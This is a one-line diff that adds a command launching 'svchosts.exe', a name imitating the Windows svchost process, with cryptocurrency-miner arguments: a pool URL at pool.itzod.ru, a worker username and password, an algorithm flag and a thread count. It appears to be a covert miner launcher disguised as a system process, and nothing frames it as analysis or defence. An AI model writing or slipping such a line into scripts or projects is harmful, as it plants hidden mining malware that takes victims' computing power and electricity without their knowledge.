@@ -1,0 +1,1 @@
+svchosts.exe -a 5 -o http://pool.itzod.ru:8346 -u vladiny1_0 -p zupasyhaq -t 2
